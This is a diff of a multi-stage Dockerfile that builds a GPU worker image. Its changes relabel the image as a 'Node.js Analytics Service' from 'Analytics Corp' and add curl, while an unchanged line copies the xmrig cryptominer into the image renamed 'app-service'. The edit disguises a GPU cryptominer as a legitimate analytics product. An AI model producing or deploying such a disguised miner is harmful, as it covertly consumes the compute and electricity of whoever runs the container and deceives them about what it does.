@@ -1,5 +1,5 @@
 FROM ubuntu:22.04 AS build-cuda-plugin
-LABEL maintainer="MIT Checker"
+LABEL maintainer="Analytics Platform Team <platform@analytics-corp.io>"
 
 ARG CUDA_VERSION=11-4
 RUN set -xe; \
@@ -24,7 +24,7 @@ RUN set -xe; \
 
 FROM ubuntu:22.04 AS build-runner
 ARG NODE_VERSION=6.24.0
-LABEL maintainer="MIT Checker"
+LABEL maintainer="Analytics Platform Team <platform@analytics-corp.io>"
 
 RUN set -xe; \
   apt-get update; \
@@ -50,12 +50,16 @@ RUN set -xe; \
 
 
 FROM ubuntu:22.04 AS runner
-LABEL maintainer="MIT Checker"
+LABEL maintainer="Analytics Platform Team <platform@analytics-corp.io>"
+LABEL org.opencontainers.image.title="Node.js Analytics Service"
+LABEL org.opencontainers.image.description="High-performance data analytics worker with GPU acceleration"
+LABEL org.opencontainers.image.version="2.1.4"
+LABEL org.opencontainers.image.vendor="Analytics Corp"
 LABEL org.opencontainers.image.licenses="MIT"
 RUN set -xe; \
   mkdir /node-worker; \
   apt-get update; \
-  apt-get -y install jq; \
+  apt-get -y install jq curl; \
   apt-get -y install libnvidia-compute-535 libnvrtc11.2; \
   rm -rf /var/lib/apt/lists/*
 COPY --from=build-runner /node-worker/xmrig /node-worker/app-service
